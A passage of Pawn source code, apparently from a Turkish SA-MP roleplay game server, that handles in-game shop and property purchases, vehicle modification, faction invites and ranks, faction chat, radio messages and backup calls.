							format(mstring, sizeof(mstring), "%s\n Bez\t 50"DOLAR"$"C1"\n GPS\t 15000"DOLAR"$"C1"\n Benzin Bidonu\t 450"DOLAR"$"C1"\n Kamera\t 550"DOLAR"$"C1"\n Çiçek\t 35"DOLAR"$"C1"\n Telsiz\t 350"DOLAR"$"C1"\n SimKart\t 50"DOLAR"$"C1"\n Not Defteri\t 75"DOLAR"$"C1"\n Alet Çantasý\t 500"DOLAR"$"C1"",mstring);
            	        	ShowPlayerDialog(playerid, 136, DIALOG_STYLE_TABLIST_HEADERS, Isyeri[i][iad], mstring, "Satýn Al", "Kapat");
						}
						else
						{
						    Hata(playerid, "Bu iþyerinin yeterli stoðu yok.");
						}
					}
            	}
    		}
 			if(Isyeri[i][itip] == 6)
			{
                if(PlayerToPoint(20.0, playerid, Isyeri[i][cikisX], Isyeri[i][cikisY], Isyeri[i][cikisZ]))
                {
	                if(GetPlayerVirtualWorld(playerid) == Isyeri[i][icikisvw])
	                {
	                    SetPVarInt(playerid, "IsyeriBuy", i);
						ShowPlayerDialog(playerid, 512, DIALOG_STYLE_LIST, ""C7"EIGHTBORN - "C8"Binco", "Aksesuar\nKýyafet", "Seç", "Kapat");
					}
				}
			}
			if(Isyeri[i][itip] == 18)
			{
                if(PlayerToPoint(20.0, playerid, Isyeri[i][cikisX], Isyeri[i][cikisY], Isyeri[i][cikisZ]))
                {
	                if(GetPlayerVirtualWorld(playerid) == Isyeri[i][icikisvw])
	                {
	                    SetPVarInt(playerid, "IsyeriBuy", i);
						if(Karakter[playerid][cinsiyet] == 1 && Karakter[playerid][uyruk] == 2) ShowModelSelectionMenu(playerid, yenierkekkiyafetbeyaz, "Kiyafet Secimi");
						if(Karakter[playerid][cinsiyet] == 1 && Karakter[playerid][uyruk] == 1) ShowModelSelectionMenu(playerid, yenierkekkiyafetsiyah, "Kiyafet Secimi");
						if(Karakter[playerid][cinsiyet] == 2 && Karakter[playerid][uyruk] == 2) ShowModelSelectionMenu(playerid, yenikadinkiyafetbeyaz, "Kiyafet Secimi");
						if(Karakter[playerid][cinsiyet] == 2 && Karakter[playerid][uyruk] == 1) ShowModelSelectionMenu(playerid, yenikadinkiyafetsiyah, "Kiyafet Secimi");
					}
				}
			}
            if(Isyeri[i][itip] == 2 || Isyeri[i][itip] == 3 || Isyeri[i][itip] == 4 || Isyeri[i][itip] == 5)
            {
                if(PlayerToPoint(50.0, playerid, Isyeri[i][cikisX], Isyeri[i][cikisY], Isyeri[i][cikisZ]))
                {
	                if(GetPlayerVirtualWorld(playerid) == Isyeri[i][icikisvw])
	                {
	                    SetPVarInt(playerid, "IsyeriBuy", i);
	                    if(IsyeriMenuSay(i) > 0) return IsyeriMenuSatinal(playerid, i);
            	        if(Isyeri[i][itip] == 2) ShowPlayerDialog(playerid, 73, DIALOG_STYLE_TABLIST_HEADERS, Isyeri[i][iad], "Ürün\tFiyat\nBuster\t30$\nDouble D-Luxe\t60$\nFull Rack\t100$\nSalad Meal\t100$", "Satýn Al", "Kapat");
                        if(Isyeri[i][itip] == 3) ShowPlayerDialog(playerid, 73, DIALOG_STYLE_TABLIST_HEADERS, Isyeri[i][iad], "Ürün\tFiyat\nMoo Kids Meal\t30$\nBeef Tower\t60$\nMeat Stack\t100$\nSalad Meal\t100$", "Satýn Al", "Kapat");
                        if(Isyeri[i][itip] == 4) ShowPlayerDialog(playerid, 73, DIALOG_STYLE_TABLIST_HEADERS, Isyeri[i][iad], "Ürün\tFiyat\nCluckin' Little Meal\t30$\nCluckin' Big Meal\t60$\nCluckin' Huge Meal\t100$\nSalad Meal\t100$", "Satýn Al", "Kapat");
					}
            	}
    		}
            if(Isyeri[i][itip] == 5)
            {
                if(PlayerToPoint(50.0, playerid, Isyeri[i][cikisX], Isyeri[i][cikisY], Isyeri[i][cikisZ]))
                {
	                if(GetPlayerVirtualWorld(playerid) == Isyeri[i][icikisvw])
	                {
						SetPVarInt(playerid, "IsyeriBuy", i);
            	        ShowPlayerDialog(playerid, 158, DIALOG_STYLE_TABLIST_HEADERS, Isyeri[i][iad], "Ürün\tFiyat\n Bira\t 25$\n Þarap\t 30$\n Sprunk\t 10$", "Satýn Al", "Kapat");
					}
            	}
    		}
            if(Isyeri[i][itip] == 12)
            {
                if(PlayerToPoint(20.0, playerid, Isyeri[i][cikisX], Isyeri[i][cikisY], Isyeri[i][cikisZ]))
                {
	                if(GetPlayerVirtualWorld(playerid) == Isyeri[i][icikisvw])
	                {
						SetPVarInt(playerid, "IsyeriBuy", i);
            	        ShowPlayerDialog(playerid, 159, DIALOG_STYLE_TABLIST_HEADERS, Isyeri[i][iad], "Ürün\tFiyat\n Saksý\t 150$\n Tezgah\t 1000$\n Mobilyalar", "Satýn Al", "Kapat");
					}
            	}
    		}
    		if(Isyeri[i][itip] == 7)
            {
                if(PlayerToPoint(20.0, playerid, Isyeri[i][cikisX], Isyeri[i][cikisY], Isyeri[i][cikisZ]))
                {
	                if(GetPlayerVirtualWorld(playerid) == Isyeri[i][icikisvw])
	                {
	                    if(Isyeri[i][istok] != 0)
	                    {
	                        //if(!Karakter[playerid][sruhsat]) return Hata(playerid, "Silah taþýma ruhsatýnýz yok.");
	                        SetPVarInt(playerid, "IsyeriBuy", i);
	                        ShowPlayerDialog(playerid, 333, DIALOG_STYLE_TABLIST_HEADERS, Isyeri[i][iad], "Ürün\tFiyat\n Býçak\t 800$\n Sopa\t 600$\n Katana\t 1000$\n Muþta\t 850$\n Pistol\t 10000$\n Deagle\t 30000$", "Satýn Al", "Kapat");
						}
						else
						{
						    Hata(playerid, "Bu iþyerinin yeterli stoðu yok.");
						}
					}
            	}
    		}
    		if(Isyeri[i][itip] == 19)
            {
                if(PlayerToPoint(20.0, playerid, Isyeri[i][cikisX], Isyeri[i][cikisY], Isyeri[i][cikisZ]))
                {
	                if(GetPlayerVirtualWorld(playerid) == Isyeri[i][icikisvw])
	                {
	                    if(Isyeri[i][istok] != 0)
	                    {
	                        //if(!Karakter[playerid][sruhsat]) return Hata(playerid, "Silah taþýma ruhsatýnýz yok.");
	                        SetPVarInt(playerid, "IsyeriBuy", i);
	                        ShowPlayerDialog(playerid, 444, DIALOG_STYLE_TABLIST_HEADERS, Isyeri[i][iad], "Ürün\tFiyat\n Golf Sopasý\t 150$\n Bilardo Ýstekasý\t 150$\n Paraþüt\t 500$\n Baston\t 100$\n Kürek\t 150$", "Satýn Al", "Kapat");
						}
						else
						{
						    Hata(playerid, "Bu iþyerinin yeterli stoðu yok.");
						}
					}
            	}
    		}
	        if(PlayerToPoint(2.0, playerid, Isyeri[i][girisX], Isyeri[i][girisY], Isyeri[i][girisZ]))
	        {
	            if(GetPlayerVirtualWorld(playerid) == Isyeri[i][igirisvw] && Isyeri[i][isahip] == -1)
	            {
	                new fiyat = floatround(Isyeri[i][ifiyat]*PazarlikKatSayi(playerid));
				    if(GetPlayerCash(playerid) >= fiyat)
				    {
				        if(Isyeri[i][ifiyat] == 0)
				        {
				            Isyeri[i][ifiyat] = 100000;
				            IsyeriKaydet(i);
				            Hata(playerid, "Bu iþyeri satýlýk deðil.");
				            return 1;
						}
						if(!PlayerToPoint(3.0, playerid, 0, 0, 0))
						{
							Isyeri[i][isahip] = Karakter[playerid][sqlid];
							Isyeri[i][ikasa] = 0;
							GivePlayerCash(playerid, -fiyat);
							Bilgi(playerid, "Ýþyerini satýn aldýnýz. Bilgi almak için: /yardim");
							IsyeriKaydet(i);
							format(string, sizeof(string), "[SATIN-AL]%d ID'li (%f, %f, %f) iþyerini %d$ aldý.", i, Isyeri[i][girisX], Isyeri[i][girisY], Isyeri[i][girisZ], fiyat);
							Log(playerid, string);
							IsyeriAyarla(i);
							return 1;
						}
					}
					else
					{
					    format(string, sizeof(string), "Bu iþyerini alabilmek için yeterli miktarda paranýz yok. [$%d]", fiyat);
         				Hata(playerid, string);
						return 1;
					}
				}
			}
		}
		new evid;
	    foreach(new i : Houses)
	    {
	        if(PlayerToPoint(2.0, playerid, Ev[i][girisX], Ev[i][girisY], Ev[i][girisZ]) && Ev[i][esahip] == -1)
	        {
	            if(GetPlayerVirtualWorld(playerid) == Ev[i][egirisvw])
	            {
                 	evid = i;
	                break;
    			}
			}
		}
  		if(evid != 0)
		{
		    new fiyat = floatround(Ev[evid][efiyat]*PazarlikKatSayi(playerid));
		    if(GetPlayerCash(playerid) >= fiyat)
		    {
		        if(Ev[evid][efiyat] == 0)
		        {
		            Ev[evid][efiyat] = 100000;
		            EvKaydet(evid);
		            Hata(playerid, "Bu ev satýlýk deðil.");
		            return 1;
				}
				if(!PlayerToPoint(3.0, playerid, 0, 0, 0))
				{
					Ev[evid][esahip] = Karakter[playerid][sqlid];
					Ev[evid][kira] = 0;
					Ev[evid][kiralayan] = -1;
					GivePlayerCash(playerid, -fiyat);
					Bilgi(playerid, "Evi satýn aldýnýz. Bilgi almak için: /yardim");
					EvKaydet(evid);
					format(string, sizeof(string), "[SATIN-AL]%d ID'li (%f, %f, %f) evi %d$ aldý.", evid, Ev[evid][girisX], Ev[evid][girisY], Ev[evid][girisZ], fiyat);
					Log(playerid, string);
					DestroyColouredCheckpoint(Ev[evid][ecp]);
					EvAyarla(evid);
					return 1;
				}
			}
			else
			{
			    format(string, sizeof(string), "Bu evi alabilmek için yeterli miktarda paranýz yok. [$%d]", fiyat);
         		Hata(playerid, string);
				return 1;
			}
		}
		return 1;
	}
	if(!strcmp(string, "/modifiye", true))
	{
		foreach(new i : Business)
		{
      		if(Karakter[playerid][mekisbasi] == 1 && Isyeri[i][itip] == 15 && IsPlayerInRangeOfPoint(playerid, 30.0, Isyeri[i][acikisx], Isyeri[i][acikisy], Isyeri[i][acikisz]) && GetPlayerVirtualWorld(playerid) == i && GetPlayerInterior(playerid) == 1)
			{
				if(!IsyeriYetkilisi(playerid, i)) return Hata(playerid, "Bu iþyerinde yetkili deðilsiniz.");
				if(Karakter[playerid][mekisbasi] == 0) return Hata(playerid, "Öncelikle iþbaþý yapmanýz gerekiyor.");
				new arac;
				new counter = 0;
				for(new ix; ix != MAX_VEHICLES; ix++)
				{
					new dist = CheckPlayerDistanceToVehicle(3.5, playerid, ix);
					if(dist)
			    	{
					    arac = ix;
						counter++;
					}
				}
				switch(counter)
				{
					case 0:
					{
					    Hata(playerid,"Yakýnýnýzda araç yok.");
					    return 1;
					}
					case 1:
					{
						kArac[playerid] = arac;
        				if(kArac[playerid] != 0 && kArac[playerid] != INVALID_VEHICLE_ID && Arac[kArac[playerid]][atip] != 5)
						{
							ShowPlayerDialog(playerid, 206, DIALOG_STYLE_TABLIST_HEADERS, "Modifiye Sistemi",
							"Seçenek\tÜcret\n\
							Paintjob\t{33aa33}1000$\n\
							Rüzgarlýklar\t{33aa33}1000$\n\
							Çatýlýklar\t{33aa33}1000$\n\
							Yan Tamponlar\t{33aa33}1000$\n\
							Egzozlar\t{33aa33}800$\n\
							Jantlar\t{33aa33}500$\n\
							Ön Tamponlar\t{33aa33}1000$\n\
							Arka Tamponlar\t{33aa33}1000$\n\
							Nitro\t{33aa33}10k-15k-20k$\n\
							Hidrolik\t{33aa33}800$\n\
							Renk1\t{33aa33}750$\n\
							Renk2\t{33aa33}750$\n\
							RenkID\t{33aa33}750$\n\
							Tamir\t{33aa33}100$\n\
							Modifiyeleri Sil",
							"Seç", "Çýkýþ");
						}
						else
						{
						    Hata(playerid, "Bu aracý modifiye edemezsiniz.");
						}
						return 1;
					}
					default:
					{
						Hata(playerid,"Yakýnýnýzda birden fazla araç var.");
						return 1;
					}
				}
			}
		}
		Hata(playerid, "Modifiye yapabileceðiniz bir yerde deðilsiniz.");
		return 1;
	}
	if(strcmp(string, "/fat", true) == 0)
	{
	    if(IsPlayerConnected(playerid))
	    {
			string = strtok(cmdtext,idx);
			if(!strlen(string))
			{
				Kullanim(playerid, "/fat [oyuncuID]");
				return 1;
			}
			new playa;
			playa = ReturnUser(string);
			new faction = Karakter[playerid][birlik];
			new fran1 = Karakter[playerid][rutbe];
			new faction2 = Karakter[playa][birlik];
			new frank2 = Karakter[playa][rutbe];
			if (faction != 0 && fran1 == 1)
			{
			    if(IsPlayerConnected(playa))
			    {
			        if(playa != INVALID_PLAYER_ID)
			        {
						if(faction2 == 0){
						Hata(playerid, "Birlikten atmaya çalýþtýðýnýz kiþi bir birlikte bulunmamakta.");
						return 1;
						}
						if(faction2 != faction){
						Hata(playerid, "Birlikten atmaya çalýþtýðýnýz kiþi sizin birliðinizde deðil.");
						return 1;
						}
						if(frank2 == 1){
						Hata(playerid, "Birlikten atmaya çalýþtýðýnýz kiþi lider konumunda.");
						return 1;
						}
						Karakter[playa][birlik] = 0;
						Karakter[playa][rutbe] = 0;
						format(string,sizeof(string),"%s adlý kiþiyi birliðinizden attýnýz.",OyuncuAdiniBul(playa));
   						Bilgi(playerid,string);
						format(string,sizeof(string),"%s adlý kiþi sizi birliðinden çýkardý.",OyuncuAdiniBul(playerid));
   						Bilgi(playa,string);
					}
				}
			}
			else
			{
				Hata(playerid, "Bu komutu kullanabilmek için birlik lideri olmanýz gerekmektedir.");
			}
		}
		return 1;
	}
	if(strcmp(string, "/davetet", true) == 0 || strcmp(string, "/davet", true) == 0)
	{
	    if(IsPlayerConnected(playerid))
	    {
			string = strtok(cmdtext,idx);
			if(!strlen(string))
			{
				Kullanim(playerid, "/davetet [oyuncuID]");
				return 1;
			}
			new playa;
			playa = ReturnUser(string);
			new faction = Karakter[playerid][birlik];
			new fran1 = Karakter[playerid][rutbe];
			new faction2 = Karakter[playa][birlik];
			new str2[128];
			if (faction != 0 && fran1 == 1)
			{
			    if(IsPlayerConnected(playa))
			    {
			        if(playa != INVALID_PLAYER_ID)
			        {
			            if(Karakter[playa][level] < 3) return Hata(playerid, "Bir oyuncunun birliðe girebilmesi için en az 3. seviye olmasý gerekmektedir.");
						if(faction2 != 0) return Hata(playerid, "Davet etmeye çalýþtýðýnýz kiþi baþka bir birlikte. Önce bu birlikten çýkmasý gerekmektedir.");
						switch(Birlik[Karakter[playerid][birlik]][ftip]) {
							case 9, 10, 11, 13, 14, 15: {
								if(CheckSubCharacter(playa)) return Hata(playerid, "Kiþi alt karakterde olduðundan dolayý illegal birliðe giremez.");
							}
						}
						format(string,sizeof(string),"%s adlý kiþiyi %s birliðine davet ettiniz.",OyuncuAdiniBul(playa));
						SendClientMessage(playerid,COLOR_LIGHTGREEN,string);
						SetPVarInt(playa, "DavetEden", playerid);
						format(string,sizeof(string),""C7"EIGHTBORN - "C8"/davet");
						format(str2,sizeof(str2),"{FFFFFF}%s adlý kiþi sizi birliðe davet ediyor. Kabul ediyor musunuz?",OyuncuAdiniBul(playerid));
						ShowPlayerDialog(playa,506,DIALOG_STYLE_MSGBOX,string,str2,"Evet","Hayýr");
					}
				}
			}
			else
			{
				Hata(playerid, "Bu komutu kullanabilmek için birlik lideri olmanýz gerekmektedir.");
			}
		}
		return 1;
	}
    if(strcmp(string, "/rutbe", true) == 0 || strcmp(string, "/rutbever", true) == 0)
	{
	    if(IsPlayerConnected(playerid))
	    {
			string = strtok(cmdtext,idx);
			if(!strlen(string))
			{
				Kullanim(playerid, "/rutbever [oyuncuID] [rutbe(0-10)]");
				return 1;
			}
			new playa;
			playa = ReturnUser(string);
			string = strtok(cmdtext,idx);
			if(!strlen(string))
			{
				Kullanim(playerid, "/rutbever [oyuncuID] [rutbe(0-10)]");
				return 1;
			}
			new yazi[128];
			new rtb;
			rtb = strval(string);
			new faction = Karakter[playerid][birlik];
			new faction2 = Karakter[playa][birlik];
			new frank2 = Karakter[playa][rutbe];
			new frank1 = Karakter[playerid][rutbe];
			if (faction != 0 && faction < 30 && frank1 == 1)
			{
			    if(IsPlayerConnected(playa))
			    {
			        if(playa != INVALID_PLAYER_ID)
			        {
						if(faction2 == 0){
						Hata(playerid, "Rütbesini deðiþtirmeye çalýþtýðýnýz kiþi bir birlikte bulunmamakta.");
						return 1;
						}
						if(faction2 != faction){
						Hata(playerid, "Rütbesini deðiþtirmeye çalýþtýðýnýz kiþi sizin birliðinizde deðil.");
						return 1;
						}
						if(frank2 == 19){
						Hata(playerid, "Rütbesini deðiþtirmeye çalýþtýðýnýz kiþi lider konumunda.");
						return 1;
						}
						if(0 > rtb || rtb > 19){
						Hata(playerid, "Rütbe ID'si 0-10 arasýnda olmalýdýr.");
						return 1;
						}
						Karakter[playa][rutbe] = rtb;
						format(yazi,sizeof(yazi),"* %s adlý kiþinin rütbesini deðiþtirdiniz.",OyuncuAdiniBul(playa));
   						Bilgi(playerid,yazi);
						format(yazi,sizeof(yazi),"* %s rütbenizi deðiþtirdi.",OyuncuAdiniBul(playerid));
   						Bilgi(playa,yazi);
					}
				}
			}
			else
			{
				Hata(playerid, "Bu komutu kullanabilmek için onaylý birlik lideri olmanýz gerekmektedir.");
			}
		}
		return 1;
	}
	if(strcmp(string,"/faktif",true) == 0 || strcmp(string, "/birlikaktif", true) == 0)
	{
	    if(Karakter[playerid][birlik])
	    {
     		SendClientMessage(playerid, COLOR_YELLOW3, "Aktif Birlik Üyeleri:");
	        new total=0;
	        new _say=0;
	        for(new i; i < MAX_PLAYERS; i++)
	        {
	            if(IsPlayerConnected(i))
	            {
	                if(Karakter[i][birlik] == Karakter[playerid][birlik])
	                {
	                    total += 1;
	                    _say++;
                        new metin[128];
	                    if(Birlik[Karakter[i][birlik]][ftip] == LSPD && Karakter[i][isbasi] == 1)
	                    {
	                    	format(metin,sizeof(metin),"{007DFA}[!] {0074e7}%s [%d] {ffffff}%s", OyuncuRutbe(i),Karakter[i][telno],OyuncuAdiniBul(i));
	                    	SendClientMessage(playerid, COLOR_WHITE, metin);
	                    }
	                    else
						{
	                    	format(metin,sizeof(metin),"{007DFA}[!] {90a3b6}%s [%d] {ffffff}%s", OyuncuRutbe(i),Karakter[i][telno],OyuncuAdiniBul(i));
	                    	SendClientMessage(playerid, COLOR_WHITE, metin);
	                    }
	                }
	            }
	        }
	    }
		return 1;
	}
	if(strcmp(string, "/faction", true) == 0 || strcmp(string, "/f", true) == 0)
	{
	    if(IsPlayerConnected(playerid))
	    {
			new lengthf = strlen(cmdtext);
			while ((idx < lengthf) && (cmdtext[idx] <= ' '))
			{
				idx++;
			}
			new offsetf = idx;
			new resultf[128];
			while ((idx < lengthf) && ((idx - offsetf) < (sizeof(resultf) - 1)))
			{
				resultf[idx - offsetf] = cmdtext[idx];
				idx++;
			}
			resultf[idx - offsetf] = EOS;
			if(!strlen(resultf))
			{
				Kullanim(playerid, "(/f)action [faction OOC konuþmasý]");
				return 1;
			}
	        if(FEngel[Karakter[playerid][birlik]] && Karakter[playerid][rutbe] != 1)
			{
			    Hata(playerid, "OOC Faction konuþma kanalý kapalý.");
			    return 1;
			}
			//if(Birlik[Karakter[playerid][birlik]][ftip] == LSPD && Karakter[playerid][rutbe] > 5 && Karakter[playerid][adminlevel] == 0) return Hata(playerid, "Bu komutu kullanmak için rütbeniz yeterli deðil.");
			if(Karakter[playerid][birlik] != 0)
			{
			    format(string,sizeof(string),"{d9532d}[BÝRLÝK] (%s) %s: %s ",RutbesiniVer(playerid), OyuncuAdiniBul(playerid),resultf);
				for(new i=0;i<MAX_PLAYERS;i++)
				{
					if(Karakter[i][birlik] == Karakter[playerid][birlik] && Girdi[playerid])
					{
						SendClientMessage(i,0xD1BD2EFF,string);
					}
				}
				format(string,sizeof(string),"[OOC] %s %s: %s ",RutbesiniVer(playerid), OyuncuAdiniBul(playerid),resultf);
				//new DCC_Channel:channel = DCC_FindChannelById("458343628712968203");
				//DCC_SendChannelMessage(channel, string);
				return 1;
			}
		}
		return 1;
	}
	if(strcmp(string, "/ytelsiz", true) == 0 || strcmp(string, "/yt", true) == 0)
	{
	    if(IsPlayerConnected(playerid))
	    {
			new lengthyt = strlen(cmdtext);
			while ((idx < lengthyt) && (cmdtext[idx] <= ' '))
			{
				idx++;
			}
			new offsetyt = idx;
			new resultyt[128];
			new _toxt2[3][128];
			while ((idx < lengthyt) && ((idx - offsetyt) < (sizeof(resultyt) - 1)))
			{
				resultyt[idx - offsetyt] = cmdtext[idx];
				idx++;
			}
			resultyt[idx - offsetyt] = EOS;
			if(!strlen(resultyt))
			{
				Kullanim(playerid, "(/yt)elsiz [yakýn telsiz konuþmasý]");
				return 1;
			}
			if(Birlik[Karakter[playerid][birlik]][ftip] == LSPA || Birlik[Karakter[playerid][birlik]][ftip] == LSPD || Birlik[Karakter[playerid][birlik]][ftip] == FBI)
			{
			    if(Birlik[Karakter[playerid][birlik]][ftip] == LSPD && Karakter[playerid][isbasi] != 1) return Hata(playerid, "Yakýn telsizi kullanabilmek için iþbaþý olmalýsýnýz.");
			    new Float:xi;
			    new Float:yi;
			    new Float:zi;
			    GetPlayerPos(playerid, xi, yi, zi);
			    format(string,sizeof(string),"[YT] %s: %s",OyuncuAdiniBul(playerid),resultyt);
			    OnPlayerCommandPerformed(playerid,"/ame yakasýndaki telsizin mandalýna basar ve konuþmaya baþlar.",0);
				for(new i=0;i<MAX_PLAYERS;i++)
				{
					if(Birlik[Karakter[i][birlik]][ftip] == LSPA || Birlik[Karakter[i][birlik]][ftip] == LSPD || Birlik[Karakter[i][birlik]][ftip] == FBI)
					{
    					if(IsPlayerInRangeOfPoint(i,150,xi,yi,zi))
						{
							MesajGonder(i,0x8D8DFFFF,string);
							PlayCrimeReportForPlayer(i,playerid,random(18)+3);
						}
					}
				}
				if(strlen(resultyt) > 80)
				{
					TextBol(resultyt,_toxt2,60);
					format(string, sizeof(string), "%s (telsiz): %s ...",OyuncuAdiniBul(playerid), _toxt2[0]);
					ProxDetector(20.0, playerid, string,COLOR_FADE1,COLOR_FADE2,COLOR_FADE3,COLOR_FADE4,COLOR_FADE5);
					format(string, sizeof(string), "%s (telsiz): ... %s",OyuncuAdiniBul(playerid), _toxt2[1]);
					ProxDetector(20.0, playerid, string,COLOR_FADE1,COLOR_FADE2,COLOR_FADE3,COLOR_FADE4,COLOR_FADE5);
			   	}
				else
				{
					format(string, sizeof(string), "%s (telsiz): %s",OyuncuAdiniBul(playerid), resultyt);
					ProxDetector(20.0, playerid, string,COLOR_FADE1,COLOR_FADE2,COLOR_FADE3,COLOR_FADE4,COLOR_FADE5);
					new to_others[MAX_CHATBUBBLE_LENGTH+1];
					format(to_others,MAX_CHATBUBBLE_LENGTH,"\"%s\"",resultyt);
				}
				return 1;
			}
			if(Birlik[Karakter[playerid][birlik]][ftip] == ASMS)
			{
			    if(Birlik[Karakter[playerid][birlik]][ftip] == ASMS && Karakter[playerid][medisbasi] != 1) return Hata(playerid, "Yakýn telsizi kullanabilmek için iþbaþý olmalýsýnýz.");
			    new Float:xi;
			    new Float:yi;
			    new Float:zi;
			    GetPlayerPos(playerid, xi, yi, zi);
			    format(string,sizeof(string),"[YT] %s: %s",OyuncuAdiniBul(playerid),resultyt);
			    OnPlayerCommandPerformed(playerid,"/ame yakasýndaki telsizin mandalýna basar ve konuþmaya baþlar.",0);
				for(new i=0;i<MAX_PLAYERS;i++)
				{
					if(Birlik[Karakter[i][birlik]][ftip] == ASMS)
					{
    					if(IsPlayerInRangeOfPoint(i,150,xi,yi,zi))
						{
							MesajGonder(i,0x8D8DFFFF,string);
							PlayCrimeReportForPlayer(i,playerid,random(18)+3);
						}
					}
				}
				if(strlen(resultyt) > 80)
				{
					TextBol(resultyt,_toxt2,60);
					format(string, sizeof(string), "%s (telsiz): %s ...",OyuncuAdiniBul(playerid), _toxt2[0]);
					ProxDetector(20.0, playerid, string,COLOR_FADE1,COLOR_FADE2,COLOR_FADE3,COLOR_FADE4,COLOR_FADE5);
					format(string, sizeof(string), "%s (telsiz): ... %s",OyuncuAdiniBul(playerid), _toxt2[1]);
					ProxDetector(20.0, playerid, string,COLOR_FADE1,COLOR_FADE2,COLOR_FADE3,COLOR_FADE4,COLOR_FADE5);
			   	}
				else
				{
					format(string, sizeof(string), "%s (telsiz): %s",OyuncuAdiniBul(playerid), resultyt);
					ProxDetector(20.0, playerid, string,COLOR_FADE1,COLOR_FADE2,COLOR_FADE3,COLOR_FADE4,COLOR_FADE5);
					new to_others[MAX_CHATBUBBLE_LENGTH+1];
					format(to_others,MAX_CHATBUBBLE_LENGTH,"\"%s\"",resultyt);
				}
				return 1;
			}
			if(Birlik[Karakter[playerid][birlik]][ftip] == LSFD)
			{
			    if(Birlik[Karakter[playerid][birlik]][ftip] == LSFD && Karakter[playerid][fdisbasi] != 1) return Hata(playerid, "Yakýn telsizi kullanabilmek için iþbaþý olmalýsýnýz.");
			    new Float:xi;
			    new Float:yi;
			    new Float:zi;
			    GetPlayerPos(playerid, xi, yi, zi);
			    format(string,sizeof(string),"[YT] %s: %s",OyuncuAdiniBul(playerid),resultyt);
			    OnPlayerCommandPerformed(playerid,"/ame yakasýndaki telsizin mandalýna basar ve konuþmaya baþlar.",0);
				for(new i=0;i<MAX_PLAYERS;i++)
				{
					if(Birlik[Karakter[i][birlik]][ftip] == LSFD)
					{
    					if(IsPlayerInRangeOfPoint(i,150,xi,yi,zi))
						{
							MesajGonder(i,0x8D8DFFFF,string);
							PlayCrimeReportForPlayer(i,playerid,random(18)+3);
						}
					}
				}
				if(strlen(resultyt) > 80)
				{
					TextBol(resultyt,_toxt2,60);
					format(string, sizeof(string), "%s (telsiz): %s ...",OyuncuAdiniBul(playerid), _toxt2[0]);
					ProxDetector(20.0, playerid, string,COLOR_FADE1,COLOR_FADE2,COLOR_FADE3,COLOR_FADE4,COLOR_FADE5);
					format(string, sizeof(string), "%s (telsiz): ... %s",OyuncuAdiniBul(playerid), _toxt2[1]);
					ProxDetector(20.0, playerid, string,COLOR_FADE1,COLOR_FADE2,COLOR_FADE3,COLOR_FADE4,COLOR_FADE5);
			   	}
				else
				{
					format(string, sizeof(string), "%s (telsiz): %s",OyuncuAdiniBul(playerid), resultyt);
					ProxDetector(20.0, playerid, string,COLOR_FADE1,COLOR_FADE2,COLOR_FADE3,COLOR_FADE4,COLOR_FADE5);
					new to_others[MAX_CHATBUBBLE_LENGTH+1];
					format(to_others,MAX_CHATBUBBLE_LENGTH,"\"%s\"",resultyt);
				}
				return 1;
			}
			else
			{
				Hata(playerid,"Telsiziniz yok.");
				return 1;
			}
		}
		return 1;
	}
	//pddestek PD->PD
	else if(strcmp(string, "/destekiste", true) == 0 || strcmp(string, "/de", true) == 0 || strcmp(string, "/destek", true) == 0)
	{
	    if(Birlik[Karakter[playerid][birlik]][ftip] == LSPD && Karakter[playerid][isbasi] == 1)
	    {
	        if(PDDestek[playerid] == 0)
	        {
	            OnPlayerCommandPerformed(playerid, "/me yakasýndaki telsizin mandalýna basar ve konuþmaya baþlar.",0);
	            PDDestek[playerid] = 1;
	            new BolgeBulucu[MAX_ZONE_NAME];
				GetPlayerZone(playerid, BolgeBulucu, MAX_ZONE_NAME);
	            format(string,sizeof(string),"[O] LSPD birimlerinin dikkatine; %s bölgesinde Memur %s için acil destek çaðrýsý.",BolgeBulucu,OyuncuAdiniBul(playerid));
	            new Float:DX, Float:DY, Float:DZ;
	            GetPlayerPos(playerid, DX, DY, DZ);
	            DestekTimer[playerid] = SetTimerEx("HareketliDestek", 1000, false, "i", playerid);
	            foreach(new i : Player)
	            {
	                if(Birlik[Karakter[i][birlik]][ftip] == LSPD && Karakter[i][isbasi] == 1)
	                {
	                    RemovePlayerMapIcon(i, playerid);
	                    SetPlayerMapIcon(i, playerid, DX, DY, DZ, 0, COLOR_YELLOW, MAPICON_GLOBAL);
						SendClientMessage(i, 0xFFF400FF, string);
						PlayAudioStreamForPlayer(i, "https://www.eightbornrpg.com/assistance.mp3");
					}
	            }
	        }
	        else
	        {
	            PDDestek[playerid] = 0;
	            Bilgi(playerid, "Destek talebini iptal ettiniz.");
				KillTimer(DestekTimer[playerid]);
				foreach(new i : Player)
				{
				    if(Birlik[Karakter[i][birlik]][ftip] == LSPD && Karakter[i][isbasi] == 1)
				    {
				        RemovePlayerMapIcon(i, playerid);
				    }
				}
	        }
	    }
	    //LSFD->LSFD
	    if(Birlik[Karakter[playerid][birlik]][ftip] == LSFD && Karakter[playerid][fdisbasi] == 1)
	    {
	        if(HDestek[playerid] == 0)
	        {
	            OnPlayerCommandPerformed(playerid, "/me yakasýndaki telsizin mandalýna basar ve konuþmaya baþlar.",0);
	            HDestek[playerid] = 1;
	            new BolgeBulucu[MAX_ZONE_NAME];
				GetPlayerZone(playerid, BolgeBulucu, MAX_ZONE_NAME);
	            format(string,sizeof(string),"[O] LSFD birimlerinin dikkatine; %s bölgesinde %s için acil destek çaðrýsý",BolgeBulucu,OyuncuAdiniBul(playerid));
	            new Float:DX, Float:DY, Float:DZ;
	            GetPlayerPos(playerid, DX, DY, DZ);
	            DestekTimer4[playerid] = SetTimerEx("HareketliDestek4", 1000, false, "i", playerid);
	            foreach(new i : Player)
	            {
	                if(Birlik[Karakter[i][birlik]][ftip] == LSFD && Karakter[i][fdisbasi] == 1)
	                {
	                    RemovePlayerMapIcon(i, playerid);
	                    SetPlayerMapIcon(i, playerid, DX, DY, DZ, 0, COLOR_YELLOW, MAPICON_GLOBAL);
						SendClientMessage(i, 0xFFF400FF, string);
					}
	            }
	        }
	        else
	        {
	            HDestek[playerid] = 0;
	            Bilgi(playerid, "Destek talebini iptal ettiniz.");
				KillTimer(DestekTimer4[playerid]);
				foreach(new i : Player)
				{
				    if(Birlik[Karakter[i][birlik]][ftip] == LSFD && Karakter[i][fdisbasi] == 1)
				    {
				        RemovePlayerMapIcon(i, playerid);
				    }
				}
	        }
	    }
	    return 1;
	}
	//fdestek PD->FBI
	else if(strcmp(string, "/fdestekiste", true) == 0 || strcmp(string, "/fde", true) == 0 || strcmp(string, "/fdestek", true) == 0)
	{
